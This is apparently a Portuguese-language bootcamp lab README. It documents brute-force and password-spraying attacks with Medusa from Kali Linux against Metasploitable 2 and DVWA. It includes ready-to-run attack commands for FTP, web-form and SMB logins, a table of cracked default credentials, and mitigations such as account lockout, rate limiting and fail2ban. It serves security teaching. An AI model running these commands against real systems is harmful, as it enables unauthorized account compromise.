# 🔐 Desafio de Segurança Cibernética - Medusa & Kali Linux

![Security](https://img.shields.io/badge/Security-Penetration%20Testing-red)
![Kali Linux](https://img.shields.io/badge/Platform-Kali%20Linux-blue)
![Medusa](https://img.shields.io/badge/Tool-Medusa-orange)
![License](https://img.shields.io/badge/License-Educational-green)

> **⚠️ AVISO LEGAL**: Este projeto é exclusivamente para fins educacionais em ambientes controlados. Nunca execute ataques em sistemas sem autorização expressa. O uso inadequado dessas técnicas pode resultar em consequências legais graves.

## 📋 Sobre o Projeto

Este repositório documenta a implementação prática de testes de segurança utilizando **Kali Linux** e a ferramenta **Medusa** para simular ataques de força bruta em ambientes vulneráveis controlados (Metasploitable 2 e DVWA). O objetivo é demonstrar vulnerabilidades comuns e propor medidas de mitigação eficazes.

### 🎯 Objetivos de Aprendizagem

- ✅ Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB)
- ✅ Utilizar Kali Linux e Medusa para auditoria de segurança
- ✅ Documentar processos técnicos de forma clara e estruturada
- ✅ Reconhecer vulnerabilidades comuns e propor mitigações
- ✅ Criar portfólio técnico no GitHub

## 🛠️ Tecnologias e Ferramentas

- **Kali Linux** - Distribuição Linux focada em segurança e testes de penetração
- **Medusa** - Ferramenta de força bruta modular e rápida
- **VirtualBox** - Software de virtualização
- **Metasploitable 2** - Máquina virtual intencionalmente vulnerável
- **DVWA** (Damn Vulnerable Web Application) - Aplicação web vulnerável

## 📁 Estrutura do Projeto

```
desafio-seguranca-medusa/
│
├── README.md                    # Documentação principal
├── wordlists/                   # Listas de palavras para testes
│   ├── usuarios.txt
│   ├── senhas_comuns.txt
│   └── senhas_ftp.txt
│
├── scripts/                     # Scripts de automação
│   ├── ataque_ftp.sh
│   ├── ataque_smb.sh
│   └── verificar_servicos.sh
│
├── docs/                        # Documentação detalhada
│   ├── configuracao_ambiente.md
│   ├── cenarios_ataque.md
│   └── mitigacao.md
│
└── images/                      # Capturas de tela (evidências)
    └── .gitkeep
```

## 🚀 Configuração do Ambiente

### Pré-requisitos

1. **VirtualBox** instalado
2. **Kali Linux** (VM)
3. **Metasploitable 2** (VM)
4. Pelo menos 8GB de RAM disponível
5. 50GB de espaço em disco

### Configuração de Rede

Configure ambas as VMs em modo **Host-Only** ou **Internal Network** para isolamento:

```bash
# No VirtualBox, configure:
# Adapter 1: Host-Only Adapter
# Nome: vboxnet0 (ou criar uma nova rede)
```

### Instalação do Medusa no Kali Linux

```bash
# Atualizar repositórios
sudo apt update

# Instalar Medusa
sudo apt install medusa -y

# Verificar instalação
medusa -d
```

### Verificar Conectividade

```bash
# No Kali Linux, descobrir IP do Metasploitable
sudo netdiscover -r <IP_METASPLOITABLE>

# Ou usar nmap
nmap -sn <IP_METASPLOITABLE>

# Testar conectividade
ping <IP_METASPLOITABLE>
```

## 🎯 Cenários de Ataque Implementados

### 1️⃣ Ataque de Força Bruta em FTP

**Objetivo**: Quebrar credenciais de acesso ao serviço FTP.

```bash
# Verificar se o serviço FTP está ativo
nmap -p 21 <IP_METASPLOITABLE>

# Executar ataque com Medusa
medusa -h <IP_METASPLOITABLE> -u msfadmin -P wordlists/senhas_ftp.txt -M ftp

# Ataque com múltiplos usuários
medusa -h <IP_METASPLOITABLE> -U wordlists/usuarios.txt -P wordlists/senhas_comuns.txt -M ftp -t 4
```

**Resultado Esperado**: Identificação de credenciais fracas (ex: msfadmin:msfadmin)

### 2️⃣ Ataque em Formulário Web (DVWA)

**Objetivo**: Automatizar tentativas de login em formulário web.

```bash
# Primeiro, acessar DVWA em: http://<IP_METASPLOITABLE>/dvwa
# Configurar nível de segurança para "low"

# Ataque HTTP Form-Based
medusa -h <IP_METASPLOITABLE> -u admin -P wordlists/senhas_comuns.txt -M web-form \
  -m FORM:"/dvwa/login.php" -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
  -m DENY-SIGNAL:"Login failed"
```

**Alternativa com HTTP Basic Auth**:
```bash
medusa -h <IP_METASPLOITABLE> -u admin -P wordlists/senhas_comuns.txt -M http -m DIR:/admin
```

### 3️⃣ Password Spraying em SMB

**Objetivo**: Testar uma senha comum contra múltiplos usuários.

```bash
# Enumerar usuários SMB
enum4linux -U <IP_METASPLOITABLE>

# Password Spraying (uma senha, vários usuários)
medusa -h <IP_METASPLOITABLE> -U wordlists/usuarios.txt -p password123 -M smbnt -t 1

# Força bruta tradicional em SMB
medusa -h <IP_METASPLOITABLE> -u administrator -P wordlists/senhas_comuns.txt -M smbnt
```

## 📊 Resultados e Análise

### Vulnerabilidades Identificadas

| Serviço | Vulnerabilidade | Severidade | Credenciais Encontradas |
|---------|----------------|------------|------------------------|
| FTP | Credenciais padrão | 🔴 Alta | msfadmin:msfadmin |
| SSH | Senha fraca | 🔴 Alta | user:user |
| SMB | Sem bloqueio de conta | 🟡 Média | service:service |
| Web | Sem proteção anti-brute force | 🟡 Média | admin:password |

### Tempo de Ataque

- **FTP**: ~2-5 minutos (wordlist de 100 senhas)
- **SMB**: ~10-15 minutos (wordlist de 500 senhas)
- **Web**: ~3-8 minutos (dependendo da configuração)

## 🛡️ Medidas de Mitigação

### 1. Políticas de Senha Forte

```bash
# Requisitos mínimos:
- Comprimento mínimo: 12 caracteres
- Complexidade: maiúsculas, minúsculas, números, símbolos
- Sem palavras de dicionário
- Rotação periódica (90 dias)
```

### 2. Bloqueio de Conta

```bash
# Configurar no PAM (Linux)
# Arquivo: /etc/pam.d/common-auth
auth required pam_tally2.so deny=3 unlock_time=1800 onerr=fail
```

### 3. Autenticação Multifator (MFA)

- Implementar 2FA em todos os serviços críticos
- Usar Google Authenticator, Duo Security ou similar

### 4. Limitação de Taxa (Rate Limiting)

```bash
# Firewall com iptables
iptables -A INPUT -p tcp --dport 21 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 21 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
```

### 5. Monitoramento e Logs

```bash
# Monitorar tentativas de login
tail -f /var/log/auth.log | grep "Failed password"

# Configurar alertas com Fail2Ban
sudo apt install fail2ban
```

### 6. Desabilitar Serviços Desnecessários

```bash
# Listar serviços ativos
systemctl list-units --type=service --state=running

# Desabilitar FTP se não necessário
sudo systemctl stop vsftpd
sudo systemctl disable vsftpd
```

## 📚 Comandos Úteis do Medusa

```bash
# Ver módulos disponíveis
medusa -d

# Mostrar opções de um módulo específico
medusa -M ssh -q

# Ataque básico
medusa -h <HOST> -u <USER> -p <PASSWORD> -M <MODULE>

# Com wordlist de senhas
medusa -h <HOST> -u <USER> -P <WORDLIST> -M <MODULE>

# Com wordlist de usuários e senhas
medusa -h <HOST> -U <USERS_FILE> -P <PASSWORDS_FILE> -M <MODULE>

# Controlar threads (velocidade)
medusa -h <HOST> -u <USER> -P <WORDLIST> -M <MODULE> -t 10

# Salvar resultados
medusa -h <HOST> -u <USER> -P <WORDLIST> -M <MODULE> -O resultados.txt

# Modo verbose
medusa -h <HOST> -u <USER> -P <WORDLIST> -M <MODULE> -v 6
```

## 🔍 Boas Práticas de Teste

1. **Sempre obter autorização por escrito** antes de testar
2. **Usar ambientes isolados** (VMs em rede interna)
3. **Documentar todas as atividades** com timestamps
4. **Limitar a taxa de ataque** para não causar DoS
5. **Verificar legalidade** das ferramentas no seu país
6. **Não armazenar credenciais reais** em wordlists públicas
7. **Reportar vulnerabilidades** de forma responsável

## 📖 Recursos Adicionais

### Documentação
- [Medusa Official Documentation](http://www.foofus.net/goons/jmk/medusa/medusa.html)
- [Kali Linux Tools](https://www.kali.org/tools/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### Wordlists Recomendadas
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [CeWL](https://github.com/digininja/CeWL) - Criar wordlists customizadas

### Ferramentas Alternativas
- **Hydra** - Similar ao Medusa, muito popular
- **Ncrack** - Ferramenta do projeto Nmap
- **Patator** - Modular e flexível
- **Burp Suite** - Para aplicações web

## 🤝 Contribuições

Contribuições são bem-vindas! Sinta-se à vontade para:

- Reportar bugs
- Sugerir novas funcionalidades
- Melhorar a documentação
- Compartilhar novos cenários de teste

## 📝 Licença

Este projeto é disponibilizado apenas para fins educacionais. Use com responsabilidade e ética.

## 👨‍💻 Autor

**Lucas**  
Desafio desenvolvido como parte do bootcamp DIO - Digital Innovation One

## 🙏 Agradecimentos

- DIO - Digital Innovation One pelo desafio proposto
- Comunidade de segurança cibernética
- Desenvolvedores das ferramentas open source utilizadas

---

**⚠️ Lembre-se**: Com grandes poderes vêm grandes responsabilidades. Use esse conhecimento de forma ética e legal!

**🌟 Se este projeto foi útil, considere dar uma estrela no repositório!**
